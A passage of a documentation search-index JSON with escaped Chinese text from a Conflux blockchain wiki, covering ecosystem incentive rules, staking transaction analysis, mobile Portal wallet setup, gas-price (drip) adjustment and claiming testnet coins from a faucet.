\u7533\u8bf7\u6fc0\u52b1\u6d41\u7a0b"},{"location":"development/incentive-guide/#_9","text":"\u63a8\u8350\u4eba\u5728\u63a8\u8350\u7684\u9879\u76eeL1\u9636\u6bb5\u9a8c\u6536\u901a\u8fc7\u65f6\u83b7\u5f97\u9879\u76eeL1\u9636\u6bb5\u91d1\u989d2%\u4f5c\u4e3a\u9879\u76ee\u9080\u8bf7\u6fc0\u52b1\u3002\u5982\u679c\u9879\u76ee\u5b8c\u6210L2\u9636\u6bb5\u9a8c\u6536\uff0c\u9879\u76ee\u9080\u8bf7\u4eba\u53ef\u5728\u5e74\u7ec8\u6280\u672f\u793e\u533a\u8d21\u732e\u7533\u62a5\u65f6\u518d\u6b21\u83b7\u5f97\u66f4\u5927\u6570\u989d\u6fc0\u52b1\u3002","title":"\u4e94\u3001\u751f\u6001\u9879\u76ee\u9080\u8bf7\u4eba\u6fc0\u52b1\u8ba1\u5212"},{"location":"development/incentive-guide/#_10","text":"","title":"\u9644\u5f55"},{"location":"development/incentive-guide/#conflux_2","text":"","title":"Conflux\u751f\u6001\u56fe\u8c31"},{"location":"development/incentive-guide/#_11","text":"\u5546\u4e1a\u76c8\u5229\u7c7b\u9879\u76ee\u8bc4\u5ba1\u524d\u987b\u5b8c\u6210\u6b64\u9879\u5185\u5bb9\uff0c\u5982\u679c\u6ca1\u6709\u5236\u4f5c\u5de5\u5177\u76f4\u63a5\u6309\u7167\u8981\u6c42\u5c06\u95ee\u9898\u548c\u7b54\u6848\u6309\u987a\u5e8f\u7f57\u5217\u5230\u7533\u8bf7\u8d34\u4e2d\u5373\u53ef\uff0c\u586b\u5199\u8981\u6c42\u6807\u51c6\u89c1\u53c2\u8003\u6587\u732e\u3002","title":"\u7cbe\u76ca\u753b\u5e03\u6a21\u677f\u53ca\u586b\u5199\u6807\u51c6"},{"location":"development/incentive-guide/#_12","text":"\u300a Conflux\u793e\u533a\u6280\u672f\u59d4\u5458\u4f1a\u7684\u5b97\u65e8 \u300b \u300a Conflux\u751f\u6001\u57fa\u91d1\u7533\u8bf7\u6d41\u7a0b\u8bf4\u660e \u300b \u300a \u751f\u6001\u9879\u76ee\u8bc4\u5ba1\u65b9\u6848(\u53c2\u89c1\u7b2c\u4e09\u8282) \u300b Conflux \u5b98\u7f51\uff1a https://confluxnetwork.org/zh/ Conflux Scan\uff1a https://confluxscan.io/ Conflux Defi\uff1a https://defi.confluxnetwork.org/zh/ Conflux \u751f\u6001\u76ee\u5f55123: https://123cfx.com/ Conflux \u5f00\u53d1\u8d44\u6599\u5305\uff1a https://juejin.cn/post/6940147768535023646 Conflux \u8bba\u575b\uff1a https://forum.conflux.fun/ Conflux Grants: https://confluxnetwork.org/zh/developers/grants \u4ec0\u4e48\u662f\u7cbe\u76ca\u753b\u5e03\uff1a https://zhuanlan.zhihu.com/p/23245402 \u7cbe\u76ca\u753b\u5e03\uff1a \u521b\u4e1a\u516c\u53f8\u8bbe\u8ba1\u5546\u4e1a\u6a21\u5f0f\u7684\u6700\u4f73\u5de5\u5177","title":"\u53c2\u8003\u6587\u732e"},{"location":"development/internal-transaction/","text":"\u4ea4\u6613\u5206\u6790 \u00b6 \u5229\u7528ConfluxScan\u5206\u6790Staking\u5408\u7ea6\u5185\u90e8\u4ea4\u4e92\u60c5\u51b5 \u00b6 \u76f8\u5173\u4ea4\u6613\u5728Scan\u5904\u7684\u663e\u793a\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u8d28\u62bc\u8c03\u7528deposit\u51fd\u6570\uff0c\u63d0\u53d6\u8c03\u7528withdraw\u51fd\u6570 \u70b9\u51fb\u4e0a\u56fe\u4e2ddeposit\u51fd\u6570\u540d\u5de6\u4fa7\u7684\u4ea4\u6613\u54c8\u5e0c\u94fe\u63a5->\u5185\u90e8\u4ea4\u6613\u540e\u53d1\u73b0\uff1adeposit\u51fd\u6570\u9700\u8981\u7528\u6237\u5730\u5740\u5411Staking\u5408\u7ea6\u8f6c\u8d26149.352CFX\uff0c\u4ee5\u8d28\u62bc\u4eab\u53d74.08%\u5e74\u5316\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u70b9\u51fbwithdraw\u51fd\u6570\u540d\u5de6\u4fa7\u7684\u4ea4\u6613\u54c8\u5e0c\u94fe\u63a5->\u5185\u90e8\u4ea4\u6613\u540e\u53d1\u73b0\uff1awithdraw\u51fd\u6570\u4f1a\u4ece\u4f7fStaking\u5408\u7ea6\u5411\u7528\u6237\u5730\u5740\u8f6c\u8d26149.352CFX\uff0c\u540c\u65f6\u8fd8\u4f1a\u5c06\u5229\u606fCFX\u4ee5 \u589e\u53d1\u7684\u5f62\u5f0f \u8f6c\u8d26\u81f3\u7528\u6237\u5730\u5740\u5904\uff0c\u56e0\u6b64\u6b64\u65f6\u7528\u6237\u5c06\u6536\u5230149.352+0.276=149.628CFX\uff1a","title":"\u4ea4\u6613\u5206\u6790"},{"location":"development/internal-transaction/#_1","text":"","title":"\u4ea4\u6613\u5206\u6790"},{"location":"development/internal-transaction/#confluxscanstaking","text":"\u76f8\u5173\u4ea4\u6613\u5728Scan\u5904\u7684\u663e\u793a\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u8d28\u62bc\u8c03\u7528deposit\u51fd\u6570\uff0c\u63d0\u53d6\u8c03\u7528withdraw\u51fd\u6570 \u70b9\u51fb\u4e0a\u56fe\u4e2ddeposit\u51fd\u6570\u540d\u5de6\u4fa7\u7684\u4ea4\u6613\u54c8\u5e0c\u94fe\u63a5->\u5185\u90e8\u4ea4\u6613\u540e\u53d1\u73b0\uff1adeposit\u51fd\u6570\u9700\u8981\u7528\u6237\u5730\u5740\u5411Staking\u5408\u7ea6\u8f6c\u8d26149.352CFX\uff0c\u4ee5\u8d28\u62bc\u4eab\u53d74.08%\u5e74\u5316\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u70b9\u51fbwithdraw\u51fd\u6570\u540d\u5de6\u4fa7\u7684\u4ea4\u6613\u54c8\u5e0c\u94fe\u63a5->\u5185\u90e8\u4ea4\u6613\u540e\u53d1\u73b0\uff1awithdraw\u51fd\u6570\u4f1a\u4ece\u4f7fStaking\u5408\u7ea6\u5411\u7528\u6237\u5730\u5740\u8f6c\u8d26149.352CFX\uff0c\u540c\u65f6\u8fd8\u4f1a\u5c06\u5229\u606fCFX\u4ee5 \u589e\u53d1\u7684\u5f62\u5f0f \u8f6c\u8d26\u81f3\u7528\u6237\u5730\u5740\u5904\uff0c\u56e0\u6b64\u6b64\u65f6\u7528\u6237\u5c06\u6536\u5230149.352+0.276=149.628CFX\uff1a","title":"\u5229\u7528ConfluxScan\u5206\u6790Staking\u5408\u7ea6\u5185\u90e8\u4ea4\u4e92\u60c5\u51b5"},{"location":"development/introduction/","text":"Conflux\u5e94\u7528\u5f00\u53d1\u5165\u95e8 \u00b6 \u968f\u7740Web3.0\u6982\u5ff5\u7684\u8bde\u751f\uff0c\u57fa\u4e8e\u533a\u5757\u94fe\u7684\u4e92\u8054\u7f51\u5e94\u7528\u5f00\u59cb\u9010\u6b65\u7206\u53d1\uff0c\u4f5c\u4e3a\u517c\u5bb9solidity\u8bed\u8a00\u7684\u516c\u94fe\u5e73\u53f0\uff0c\u5728 Conflux \u7f51\u7edc\u4e2d\u5f00\u53d1\uff0c\u90e8\u7f72\u667a\u80fd\u5408\u7ea6\u7684\u65b9\u6848\u4e0e\u4ee5\u592a\u574a\u51e0\u4e4e\u7c7b\u4f3c\u3002","title":"Conflux\u5e94\u7528\u5f00\u53d1\u5165\u95e8"},{"location":"development/introduction/#conflux","text":"\u968f\u7740Web3.0\u6982\u5ff5\u7684\u8bde\u751f\uff0c\u57fa\u4e8e\u533a\u5757\u94fe\u7684\u4e92\u8054\u7f51\u5e94\u7528\u5f00\u59cb\u9010\u6b65\u7206\u53d1\uff0c\u4f5c\u4e3a\u517c\u5bb9solidity\u8bed\u8a00\u7684\u516c\u94fe\u5e73\u53f0\uff0c\u5728 Conflux \u7f51\u7edc\u4e2d\u5f00\u53d1\uff0c\u90e8\u7f72\u667a\u80fd\u5408\u7ea6\u7684\u65b9\u6848\u4e0e\u4ee5\u592a\u574a\u51e0\u4e4e\u7c7b\u4f3c\u3002","title":"Conflux\u5e94\u7528\u5f00\u53d1\u5165\u95e8"},{"location":"development/mobile-portal/","text":"\u624b\u673a\u5b89\u88c5Portal\u94b1\u5305 \u00b6 \u80cc\u666f \u00b6 \u90e8\u5206\u540c\u5fd7\u56e0\u624b\u5934\u6ca1\u7535\u8111\uff0c\u4f46\u90e8\u5206\u751f\u6001\u9879\u76ee\uff08\u5982\u4e09\u89d2DAO\uff0cgovernance\u8d28\u62bc\uff09\u5c1a\u4e0d\u652f\u6301\u624b\u673a\u7248\u672c\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u5c06\u624b\u673a\u6539\u9020\u4e00\u4e0b\uff0c\u8ba9\u4ed6\u652f\u6301\u8fd0\u884c\u7535\u8111\u7248\u7684Portal\u94b1\u5305\uff0c\u4f7f\u4e4b\u80fd\u591f\u4e0e\u8fd9\u4e9b\u5c1a\u672a\u9002\u914d\u624b\u673a\u7248\u672c\u7684\u751f\u6001\u3002\u624b\u673a\u5b89\u88c5KIWI\u6d4f\u89c8\u5668\uff08\u4e4b\u524d\u4e5f\u7528\u8fc7yandex\u6d4f\u89c8\u5668\uff0c\u4e0d\u8fc7\u9700\u8981\u624b\u5de5\u5bfc\u5165Portal\u514d\u5b89\u88c5\u7248\uff09\uff0c\u5728KIWI\u5b89\u88c5Conflux Portal\u94b1\u5305\u3002\u4ee5\u540e\u4f53\u9a8c\u8d77\u6765\u65b9\u4fbf\u591a\u4e86\u3002 \u914d\u7f6e\u6b65\u9aa4 \u00b6 \u9b54\u6cd5\u4e0a\u7f51\uff0c\u8c37\u6b4c\u5546\u5e97\u641cKIWI\u6d4f\u89c8\u5668\uff0c\u4e0b\u8f7d\u5b89\u88c5\u3002 KIWI\u6d4f\u89c8\u5668\uff0c\u8bbf\u95ee\u6269\u5c55\u7a0b\u5e8f\u529f\u80fd \u5728\u5f39\u51fa\u7684\u6269\u5c55\u754c\u9762\u4e2d\u9009\u62e9\u201cfrom store\u201d \u5f39\u51faGoogle\u5e94\u7528\u5546\u5e97\uff0c\u641cConfluxPortal\uff0c\u6dfb\u52a0\u81f3Chrome\u3002 \u5b89\u88c5\u5b8c\u6210\uff0c\u521b\u5efa\u65b0\u94b1\u5305\uff0c\u521b\u5efa\u94b1\u5305\u6559\u7a0b\u4e0e \u7535\u8111\u7248\u5b89\u88c5Portal\u8fc7\u7a0b \u7c7b\u4f3c\uff0c\u6ce8\u610f\u5907\u4efd\u597d\u52a9\u8bb0\u8bcd \u9e23\u8c22 \u00b6 \u672c\u6587\u53c2\u8003aloner \u624b\u673a\u5b89\u88c5ConfluxPortal\uff0c\u73a9TriangleDAO\u534f\u8bae \uff0c\u7ecf\u6da6\u8272\u8c03\u6574\u540e\u7f16\u5199\uff0c\u56fe\u7247\u4ecd\u6cbf\u7528aloner\u63d0\u4f9b\u7684\u7d20\u6750\u3002","title":"\u624b\u673a\u5b89\u88c5Portal\u94b1\u5305"},{"location":"development/mobile-portal/#portal","text":"","title":"\u624b\u673a\u5b89\u88c5Portal\u94b1\u5305"},{"location":"development/mobile-portal/#_1","text":"\u90e8\u5206\u540c\u5fd7\u56e0\u624b\u5934\u6ca1\u7535\u8111\uff0c\u4f46\u90e8\u5206\u751f\u6001\u9879\u76ee\uff08\u5982\u4e09\u89d2DAO\uff0cgovernance\u8d28\u62bc\uff09\u5c1a\u4e0d\u652f\u6301\u624b\u673a\u7248\u672c\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u5c06\u624b\u673a\u6539\u9020\u4e00\u4e0b\uff0c\u8ba9\u4ed6\u652f\u6301\u8fd0\u884c\u7535\u8111\u7248\u7684Portal\u94b1\u5305\uff0c\u4f7f\u4e4b\u80fd\u591f\u4e0e\u8fd9\u4e9b\u5c1a\u672a\u9002\u914d\u624b\u673a\u7248\u672c\u7684\u751f\u6001\u3002\u624b\u673a\u5b89\u88c5KIWI\u6d4f\u89c8\u5668\uff08\u4e4b\u524d\u4e5f\u7528\u8fc7yandex\u6d4f\u89c8\u5668\uff0c\u4e0d\u8fc7\u9700\u8981\u624b\u5de5\u5bfc\u5165Portal\u514d\u5b89\u88c5\u7248\uff09\uff0c\u5728KIWI\u5b89\u88c5Conflux Portal\u94b1\u5305\u3002\u4ee5\u540e\u4f53\u9a8c\u8d77\u6765\u65b9\u4fbf\u591a\u4e86\u3002","title":"\u80cc\u666f"},{"location":"development/mobile-portal/#_2","text":"\u9b54\u6cd5\u4e0a\u7f51\uff0c\u8c37\u6b4c\u5546\u5e97\u641cKIWI\u6d4f\u89c8\u5668\uff0c\u4e0b\u8f7d\u5b89\u88c5\u3002 KIWI\u6d4f\u89c8\u5668\uff0c\u8bbf\u95ee\u6269\u5c55\u7a0b\u5e8f\u529f\u80fd \u5728\u5f39\u51fa\u7684\u6269\u5c55\u754c\u9762\u4e2d\u9009\u62e9\u201cfrom store\u201d \u5f39\u51faGoogle\u5e94\u7528\u5546\u5e97\uff0c\u641cConfluxPortal\uff0c\u6dfb\u52a0\u81f3Chrome\u3002 \u5b89\u88c5\u5b8c\u6210\uff0c\u521b\u5efa\u65b0\u94b1\u5305\uff0c\u521b\u5efa\u94b1\u5305\u6559\u7a0b\u4e0e \u7535\u8111\u7248\u5b89\u88c5Portal\u8fc7\u7a0b \u7c7b\u4f3c\uff0c\u6ce8\u610f\u5907\u4efd\u597d\u52a9\u8bb0\u8bcd","title":"\u914d\u7f6e\u6b65\u9aa4"},{"location":"development/mobile-portal/#_3","text":"\u672c\u6587\u53c2\u8003aloner \u624b\u673a\u5b89\u88c5ConfluxPortal\uff0c\u73a9TriangleDAO\u534f\u8bae \uff0c\u7ecf\u6da6\u8272\u8c03\u6574\u540e\u7f16\u5199\uff0c\u56fe\u7247\u4ecd\u6cbf\u7528aloner\u63d0\u4f9b\u7684\u7d20\u6750\u3002","title":"\u9e23\u8c22"},{"location":"development/portal-drip/","text":"\u4ea4\u6613drip\u4ecb\u7ecd \u00b6 \u80cc\u666f\u4ecb\u7ecd \u00b6 \u3010\u516c\u544a\u3011\u5173\u4e8e11\u67083\u65e5Conflux Tethys\u7f51\u7edc\u51fa\u73b0\u4ea4\u6613\u62e5\u5835\u60c5\u51b5\u8bf4\u660e Conflux \u4e2d\u7684\u4ee3\u4ed8\u673a\u5236\u8be6\u89e3 \u71c3\u6599drip\u4ecb\u7ecd \u00b6 \u73b0\u5728Conflux\u7f51\u7edc\u4e2d\u9ed8\u8ba4\u7684GAS\u662f1Drip\uff0c\u4e5f\u5c31\u662f0.00000000000000001 CFX\uff0c\u7531\u4e8e\u8f6c\u8d26\u7684\u6210\u672c\u6bd4\u8f83\u4f4e\uff0c\u6240\u4ee5\u8fd9\u6b21\u51fa\u73b0\u7684\u4e0a\u5343\u4e07\u7b14\u8f6c\u8d26\u4ee3\u4ed8\u7684\u624b\u7eed\u8d39\u7b97\u5728\u4e00\u8d77\u4e5f\u4e0d\u52301CFX\uff0c\u662f\u51e0\u4e4e\u53ef\u4ee5\u5ffd\u7565\u4e0d\u8ba1\u7684\u3002 \u6240\u8c13\u7f51\u7edc\u62e5\u5835\u5c31\u662f\u6709\u4eba\u75281Drip\u7684\u8f6c\u8d26\u7684\u624b\u7eed\u8d39\u5927\u91cf\u8f6c\u8d26\uff0c\u6bcf\u79d21500\uff5e2800\u7b14\u4ea4\u6613\u751a\u81f3\u66f4\u9ad8\uff0c\u8fd9\u6070\u6070\u8bc1\u660e\u4e86Conflux\u7684\u9ad8\u6027\u80fd\uff0c\u5982\u679c\u4f60\u7528\u5176\u4ed6\u7684\u516c\u94fe\u5c31\u7834\u4ea7\u4e86\u3002\u4f46\u5bf9\u4e8e\u5176\u4ed6\u666e\u901a\u7684\u7528\u6237\u518d\u53bb\u7528\u9ed8\u8ba4\u76841Drip\u7684\u8f6c\u8d26\u7684\u624b\u7eed\u8d39\u8f6c\u8d26\uff0c\u90a3\u8fd9\u4e2a\u4ea4\u6613\u5c31\u53ef\u80fd\u4e0d\u4f1a\u88ab\u6253\u5305\u4e86\uff0c\u9700\u8981\u6162\u6162\u6392\u961f\uff0c\u5927\u81f4\u4e0a\u548c\u4ee5\u592a\u574a Gas price \u7684\u903b\u8f91\u4e00\u6837\u7684\u3002 \u5982\u679c\u6709\u7528\u6237\u5e0c\u671b\u81ea\u5df1\u7684\u4ea4\u6613\u5feb\u70b9\u5b8c\u6210\uff0c\u90a3\u5c31\u63d0\u9ad8\u4e00\u70b9\u70b9 Gas \u7684\u4ef7\u683c\u5c31\u53ef\u4ee5\uff0c\u73b0\u5728\u7684\u8bdd 10 Drip\uff080.0000000000000001 CFX\uff09\u5c31\u53ef\u4ee5\u5927\u5e45\u63d0\u5347\u8f6c\u8d26\u7684\u901f\u5ea6\uff0c\u5982\u679c\u4e0d\u653e\u5fc3\uff0c Gas \u7684\u4ef7\u683c\u63d0\u9ad8\u52301 GDrip\uff080.000000001 CFX\uff09\u4e5f\u53ef\u4ee5\uff0c\u90fd\u662f\u51e0\u4e4e\u53ef\u4ee5\u5ffd\u7565\u4e0d\u8ba1\u7684\u3002 \u71c3\u6599\u6362\u7b97\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u4f7f\u7528Portal\uff0c\u63d0\u9ad8drip\u65b9\u6cd5\u4f7f\u4ea4\u6613\u66f4\u5feb\u88ab\u6267\u884c \u00b6 \u53d1\u8d77\u4e00\u7b14\u5408\u7ea6\u4ea4\u4e92 \u70b9\u51fb\u9ad8\u7ea7\uff0c\u8c03\u6574\u4ea4\u4e92\u82b1\u8d39\u7684drip\uff0c\u4ece1drip\u8c03\u6574\u4e3a100000drip \u70b9\u51fb\u4fdd\u5b58\uff0c\u786e\u8ba4\u4ea4\u6613 \u4ea4\u6613\u4f1a\u8f83\u5feb\u7684\u88ab\u6267\u884c\uff0c\u67e5\u770bConfluxscan\u53ef\u770b\u5230\u82b1\u8d39\u7684Gas\u60c5\u51b5 Confluxdapp\u5df2\u652f\u6301\u81ea\u5b9a\u4e49drip \u00b6 Confluxdapp\u5b98\u7f51 \uff1a\u76ee\u524d\u5df2\u652f\u6301\u5b89\u5353\uff0cIOS\u6b63\u5728\u5185\u6d4b\u4e2d","title":"\u4ea4\u6613drip\u4ecb\u7ecd"},{"location":"development/portal-drip/#drip","text":"","title":"\u4ea4\u6613drip\u4ecb\u7ecd"},{"location":"development/portal-drip/#_1","text":"\u3010\u516c\u544a\u3011\u5173\u4e8e11\u67083\u65e5Conflux Tethys\u7f51\u7edc\u51fa\u73b0\u4ea4\u6613\u62e5\u5835\u60c5\u51b5\u8bf4\u660e Conflux \u4e2d\u7684\u4ee3\u4ed8\u673a\u5236\u8be6\u89e3","title":"\u80cc\u666f\u4ecb\u7ecd"},{"location":"development/portal-drip/#drip_1","text":"\u73b0\u5728Conflux\u7f51\u7edc\u4e2d\u9ed8\u8ba4\u7684GAS\u662f1Drip\uff0c\u4e5f\u5c31\u662f0.00000000000000001 CFX\uff0c\u7531\u4e8e\u8f6c\u8d26\u7684\u6210\u672c\u6bd4\u8f83\u4f4e\uff0c\u6240\u4ee5\u8fd9\u6b21\u51fa\u73b0\u7684\u4e0a\u5343\u4e07\u7b14\u8f6c\u8d26\u4ee3\u4ed8\u7684\u624b\u7eed\u8d39\u7b97\u5728\u4e00\u8d77\u4e5f\u4e0d\u52301CFX\uff0c\u662f\u51e0\u4e4e\u53ef\u4ee5\u5ffd\u7565\u4e0d\u8ba1\u7684\u3002 \u6240\u8c13\u7f51\u7edc\u62e5\u5835\u5c31\u662f\u6709\u4eba\u75281Drip\u7684\u8f6c\u8d26\u7684\u624b\u7eed\u8d39\u5927\u91cf\u8f6c\u8d26\uff0c\u6bcf\u79d21500\uff5e2800\u7b14\u4ea4\u6613\u751a\u81f3\u66f4\u9ad8\uff0c\u8fd9\u6070\u6070\u8bc1\u660e\u4e86Conflux\u7684\u9ad8\u6027\u80fd\uff0c\u5982\u679c\u4f60\u7528\u5176\u4ed6\u7684\u516c\u94fe\u5c31\u7834\u4ea7\u4e86\u3002\u4f46\u5bf9\u4e8e\u5176\u4ed6\u666e\u901a\u7684\u7528\u6237\u518d\u53bb\u7528\u9ed8\u8ba4\u76841Drip\u7684\u8f6c\u8d26\u7684\u624b\u7eed\u8d39\u8f6c\u8d26\uff0c\u90a3\u8fd9\u4e2a\u4ea4\u6613\u5c31\u53ef\u80fd\u4e0d\u4f1a\u88ab\u6253\u5305\u4e86\uff0c\u9700\u8981\u6162\u6162\u6392\u961f\uff0c\u5927\u81f4\u4e0a\u548c\u4ee5\u592a\u574a Gas price \u7684\u903b\u8f91\u4e00\u6837\u7684\u3002 \u5982\u679c\u6709\u7528\u6237\u5e0c\u671b\u81ea\u5df1\u7684\u4ea4\u6613\u5feb\u70b9\u5b8c\u6210\uff0c\u90a3\u5c31\u63d0\u9ad8\u4e00\u70b9\u70b9 Gas \u7684\u4ef7\u683c\u5c31\u53ef\u4ee5\uff0c\u73b0\u5728\u7684\u8bdd 10 Drip\uff080.0000000000000001 CFX\uff09\u5c31\u53ef\u4ee5\u5927\u5e45\u63d0\u5347\u8f6c\u8d26\u7684\u901f\u5ea6\uff0c\u5982\u679c\u4e0d\u653e\u5fc3\uff0c Gas \u7684\u4ef7\u683c\u63d0\u9ad8\u52301 GDrip\uff080.000000001 CFX\uff09\u4e5f\u53ef\u4ee5\uff0c\u90fd\u662f\u51e0\u4e4e\u53ef\u4ee5\u5ffd\u7565\u4e0d\u8ba1\u7684\u3002 \u71c3\u6599\u6362\u7b97\u5982\u4e0b\u56fe\u6240\u793a\uff1a","title":"\u71c3\u6599drip\u4ecb\u7ecd"},{"location":"development/portal-drip/#portaldrip","text":"\u53d1\u8d77\u4e00\u7b14\u5408\u7ea6\u4ea4\u4e92 \u70b9\u51fb\u9ad8\u7ea7\uff0c\u8c03\u6574\u4ea4\u4e92\u82b1\u8d39\u7684drip\uff0c\u4ece1drip\u8c03\u6574\u4e3a100000drip \u70b9\u51fb\u4fdd\u5b58\uff0c\u786e\u8ba4\u4ea4\u6613 \u4ea4\u6613\u4f1a\u8f83\u5feb\u7684\u88ab\u6267\u884c\uff0c\u67e5\u770bConfluxscan\u53ef\u770b\u5230\u82b1\u8d39\u7684Gas\u60c5\u51b5","title":"\u4f7f\u7528Portal\uff0c\u63d0\u9ad8drip\u65b9\u6cd5\u4f7f\u4ea4\u6613\u66f4\u5feb\u88ab\u6267\u884c"},{"location":"development/portal-drip/#confluxdappdrip","text":"Confluxdapp\u5b98\u7f51 \uff1a\u76ee\u524d\u5df2\u652f\u6301\u5b89\u5353\uff0cIOS\u6b63\u5728\u5185\u6d4b\u4e2d","title":"Confluxdapp\u5df2\u652f\u6301\u81ea\u5b9a\u4e49drip"},{"location":"development/portal-faucet/","text":"ConfluxPortal\u5207\u6362\u4e3a\u6d4b\u8bd5\u7f51\u9886\u53d6\u6d4b\u8bd5\u5e01\u6559\u7a0b \u00b6 \u4f7f\u7528 Conflux Portal \u94b1\u5305\uff0c\u8fde\u5165 Conflux \u6d4b\u8bd5\u7f51\uff0c\u9886\u53d6\u6d4b\u8bd5\u5e01\uff0c\u53ef\u5728 Conflux \u6d4b\u8bd5\u7f51\u73af\u5883\u4e0b\u4f53\u9a8c\u6d4b\u8bd5\u5e01\u7684\u4ea4\u6613\u6216\u6d4b\u8bd5\u5f00\u53d1\u4e2d\u7684\u751f\u6001\u9879\u76ee\u3002 Portal\u5b89\u88c5\u6559\u7a0b\u53ef\u53c2\u8003\u672cwiki\u5185\u63d0\u4f9b\u7684\uff1a \u914d\u7f6e\u6559\u7a0b \u57fa\u672c\u65b9\u6cd5\u4ecb\u7ecd \u00b6 \u4f7f\u7528Portal\u5185\u81ea\u5e26\u7684faucet\u63a5\u53e3 \u4f7f\u7528\u6d4b\u8bd5\u7f51\u7edc\u8fde\u63a5 Conflux faucet dapp Portal\u63a5\u53e3\u7533\u8bf7\u6d4b\u8bd5CFX\u57fa\u672c\u6b65\u9aa4 \u00b6 \u5207\u6362\u7f51\u7edc\u64cd\u4f5c\u53ef\u53c2\u8003 \u7f51\u7edc\u5207\u6362 \u70b9\u51fb\u5b58\u5165 \u62c9\u5230\u9875\u9762\u4e0b\u4fa7\u5e76\u70b9\u51fb\u201c\u83b7\u53d6CFX\u201d\u6309\u94ae \u5f39\u51fa\u9875\u9762\uff0c\u7ed9\u51fa\u4ea4\u6613txid\uff1a \u518d\u6b21\u67e5\u770bPortal\uff0c\u53d1\u73b0\u5df2\u5b58\u5165100CFX Note \u200b \u6bcf\u4e2a\u5730\u5740\u4e00\u5c0f\u65f6\u5185\u53ea\u80fd\u9886\u53d6\u4e00\u6b21\u6d4b\u8bd5\u5e01\uff0c\u4e00\u5c0f\u65f6\u5185\u518d\u6b21\u70b9\u51fb\u201c\u83b7\u53d6CFX\u201d\u4f1a\u5f39\u51fa\u9886\u53d6\u5931\u8d25\u7684\u901a\u77e5\u3002 \u5c1d\u8bd5\u8f6c\u8d26cfx \u6dfb\u52a0CFX\u63a5\u6536\u65b9\uff08\u4e00\u822c\u590d\u5236\u4e00\u4e2a\u5730\u5740\uff09\uff1a \u70b9\u51fb\u786e\u8ba4\uff1a \u72b6\u6001\u4ece\u5f85\u5904\u7406\u53d8\u4e3a\u5df2\u6267\u884c \u53d1\u73b0\u8d26\u62372\u786e\u5b9e\u591a\u4e8610cfx \u8fdb\u9636\u65b9\u6cd5\uff1a\u76f4\u63a5\u4e0e\u5b98\u65b9\u63d0\u4f9b\u7684\u6d4b\u8bd5\u7f51dapp\u4ea4\u4e92 \u00b6 Conflux\u5b98\u65b9\u4e3a\u6d4b\u8bd5\u7f51\u4e5f\u5b9e\u73b0\u4e86\u4e00\u6b3edapp\uff0c\u652f\u6301CFX\u3001FC\u548cCUSDT\u7684faucet\uff0cdapp \u94fe\u63a5 \u4f7f\u7528\u6d4b\u8bd5\u7f51\u7edc\u8bbf\u95ee\u4e0a\u8ff0\u94fe\u63a5\uff1a \u70b9\u51fb\u201c\u8fde\u63a5\u94b1\u5305\u201d\uff0c\u8fd9\u65f6Portal\u4f1a\u5f39\u51fa\uff1a \u70b9\u51fb\u540e\uff0cPortal\u7a97\u53e3\u6d88\u5931\u9875\u9762\u51fa\u73b0\u53d8\u5316\uff1a \u652f\u63013\u79cd\u4ee3\u5e01 \u9009\u62e9FansCoin \u70b9\u51fb\u9886\u53d6\u6309\u94ae \u70b9\u51fbPortal\u5185\u786e\u8ba4\u6309\u94ae\uff0c\u53d1\u8d77\u5408\u7ea6\u4ea4\u4e92 \u70b9\u51fb\u4ea4\u6613\u54c8\u5e0c\uff0c\u53ef\u53d1\u73b0\u5df2\u63a5\u6536100FC\uff1a Note \u200b \u63a5\u4e0b\u6765\u8fd8\u6709\u4e00\u6b65\uff0c\u9700\u8981\u8ba9\u6211\u4eec\u5728Portal\u4e2d\u6dfb\u52a0FC\u8fd9\u4e2a\u4ee3\u5e01\uff0c\u65b9\u6cd5\uff0c\u8bf7\u53c2\u8003 \u6cd5 2\uff1a\u5408\u7ea6\u5730\u5740\u81ea\u5b9a\u4e49\u6dfb\u52a0\u4ee3\u5e01 \uff0c\u800c\u5408\u7ea6\u5730\u5740\u5df2\u5728\u4e0b\u6587\u7ed9\u51fa\u3002 \u6d4b\u8bd5\u7f51\u5408\u7ea6\u5730\u5740\u5217\u8868 \u00b6 \u6d4b\u8bd5\u7f51FC\u5408\u7ea6Scan\u5730\u5740 \uff1acfxtest:achkx35n7vngfxgrm7akemk3ftzy47t61yk5nn270s \u6d4b\u8bd5\u7f51cUSDT\u5408\u7ea6Scan\u5730\u5740 \uff1acfxtest:acepe88unk7fvs18436178up33hb4zkuf62a9dk1gv","title":"ConfluxPortal\u5207\u6362\u4e3a\u6d4b\u8bd5\u7f51\u9886\u53d6\u6d4b\u8bd5\u5e01\u6559\u7a0b"},{"location":"development/portal-faucet/#confluxportal","text":"\u4f7f\u7528 Conflux Portal \u94b1\u5305\uff0c\u8fde\u5165 Conflux \u6d4b\u8bd5\u7f51\uff0c\u9886\u53d6\u6d4b\u8bd5\u5e01\uff0c\u53ef\u5728 Conflux \u6d4b\u8bd5\u7f51\u73af\u5883\u4e0b\u4f53\u9a8c\u6d4b\u8bd5\u5e01\u7684\u4ea4\u6613\u6216\u6d4b\u8bd5\u5f00\u53d1\u4e2d\u7684\u751f\u6001\u9879\u76ee\u3002 Portal\u5b89\u88c5\u6559\u7a0b\u53ef\u53c2\u8003\u672cwiki\u5185\u63d0\u4f9b\u7684\uff1a \u914d\u7f6e\u6559\u7a0b","title":"ConfluxPortal\u5207\u6362\u4e3a\u6d4b\u8bd5\u7f51\u9886\u53d6\u6d4b\u8bd5\u5e01\u6559\u7a0b"},{"location":"development/portal-faucet/#_1","text":"\u4f7f\u7528Portal\u5185\u81ea\u5e26\u7684faucet\u63a5\u53e3 \u4f7f\u7528\u6d4b\u8bd5\u7f51\u7edc\u8fde\u63a5 Conflux faucet dapp","title":"\u57fa\u672c\u65b9\u6cd5\u4ecb\u7ecd"},{"location":"development/portal-faucet/#portalcfx","text":"\u5207\u6362\u7f51\u7edc\u64cd\u4f5c\u53ef\u53c2\u8003 \u7f51\u7edc\u5207\u6362 \u70b9\u51fb\u5b58\u5165 \u62c9\u5230\u9875\u9762\u4e0b\u4fa7\u5e76\u70b9\u51fb\u201c\u83b7\u53d6CFX\u201d\u6309\u94ae \u5f39\u51fa\u9875\u9762\uff0c\u7ed9\u51fa\u4ea4\u6613txid\uff1a 